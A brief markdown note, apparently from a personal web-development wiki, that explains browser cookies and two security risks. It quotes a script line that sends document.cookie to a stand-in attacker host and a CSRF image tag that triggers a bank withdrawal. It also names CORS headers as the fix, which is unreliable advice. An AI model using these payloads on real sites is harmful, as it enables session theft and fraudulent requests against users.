# Cookies

Cookies are a client's storage of generic data (sessions, settings, advertisement preferences).

Websites can read and write cookie values of the client.

## Cookies security risks

Cookie stealing: an external script may have the following code:
`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`

CSRF: unsanitized input may allow users to include the following script in your page:
`<img src="http://bank.example/withdraw?account=bob&amount=1000000&for=mallory">`

Solution: [CORS policy headers](<network/HTTP.md#cross-origin-request-sharing>).
